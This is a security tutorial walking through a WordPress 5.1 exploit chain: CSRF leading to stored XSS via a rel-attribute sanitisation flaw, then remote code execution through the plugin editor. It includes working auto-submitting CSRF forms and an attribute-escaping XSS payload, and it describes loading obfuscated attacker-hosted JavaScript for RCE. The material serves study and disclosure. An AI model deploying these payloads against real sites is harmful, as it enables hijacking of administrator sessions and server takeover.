Source: https://ironhackers.es/en/tutoriales/wordpress-5-1-csrf-xss-rce-poc/
Video: https://youtu.be/QnOXTcCPD3o



The vulnerability starts in a CSRF so it requires user interaction and javascript enabled in the victim’s browser.

That is to say that the victim’s browser has the session started and therefore has session cookies, 
the attacker generates a page or a malicious script (password change, transfer) that when visited or executed 
by the victim will cause it to make the request. 
When executed by the victim, the browser will automatically send the session cookies, 
performing the operation with the victim’s account.


Once a request for a WordPress has been captured under our control, we know what request we have to make a malicious form.

<html>
   <form method="POST" action="http://172.16.185.132/wordpress/wp-comments-post.php" id="iron">
        <input type="hidden" name="comment_post_ID" value="1">
        <input type="hidden" name="comment" value="PoC">
        <input type="hidden" name="comment_parent" value="0">
   </form>
   <script type="text/javascript">
 document.getElementById("iron").submit()</script>
</html>

When the victim loads this html, the form that will create a comment will be sent automatically.

Wordpress has saneization funcions.
We will bypass this to get an XSS stored


The fault was found in a functionality that exists in 
/wp-includes/formatting.php that for reasons of SEO performs a different treatment to html tags that have a rel attribute.

The fault was found in a functionality that exists in /wp-includes/formatting.php that for 
reasons of SEO performs a different treatment to html tags that have a rel attribute.

The problem is that it encapsulates each value of the attribute between double quotes so we could escape from an attribute by putting it inside a double quote.
That is :

1 <a title='ironhackers " onclick=alert(0) id="' rel="nofollow">

We would have an associative array {“title” => ‘ironhackers “onclick = alert (0) id =”‘, “rel” => ‘nofollow’}, 
when containing rel will be processed as seen in the extract above encapsulating each element of the array in double quotes. 
With this the first tag -> title = “ironhackers” onclick = alert (0) With what we would have obtained an XSS.


Let’s see it in conjunction with the CSRF. First we must modify our malicious html with the necessary payload.



<html>
<script>
function payload(){
    return "<a title='ironhackers "+ '"'+ " onclick=alert(0) id="+'"'+"'"+' rel="nofollow">Poc'
 }
</script>
   <form method="POST" action="http://172.16.185.132/wordpress/wp-comments-post.php" id="iron">
        <input type="hidden" name="comment_post_ID" value="1">
        <input type="hidden" id="payload" name="comment" value="">
        <input type="hidden" name="comment_parent" value="0">
   </form>
   <script type="text/javascript">
   document.getElementById("payload").value=payload();
 document.getElementById("iron").submit()</script>
  
</html>


he javascript function generates the value of the comment that the injected html will be.

We perform the execution of the page by the victim with an open session and we see how the XSS would work.


RCE

RCE is obtained through access to a malicious page and a click on a link, 
but it is clear that this payload can be improved, 
for example by replacing the onclick with onmouseover and making javascript execution automatic without the need to click.



Our goal is to achieve the execution of commands through javascript. 
In order to extract a valid code and test it we will use a WordPress of our control.
In this case I will upload a comment to the WordPress as an administrator that will not perform any sanetization 
and then we will proceed to try to take it to the XSS.


We will take advantage of the fact that the javascript will be executed by the victim who has the session started, 
so that through XMLHttpRequest requests to the plugin editor.

To explain the code a bit:
  - I’ll say that you first make a request to get the nonce, which is a kind of CSRF Token
  - Then use that token to make the second request

The next step is to obtain an XSS payload that allows us to load this JS.
I am sure that many of you would get a more elegant payload but I am not an expert either, 
what I thought was to load a js of my control.


he part that interests us in this case is the content of the onclick, 
since the tag structure is the same as before. 
In this case what we do is create a new element in the DOM that will be a script tag and we assign the 
src property pointing to a js of our control, 
to be able to introduce the strings I have converted by concatenating String.fromCharCode() with each ascii of each 
string used.

Finally we introduce our payload in the malicious form of the page to which the victim must access
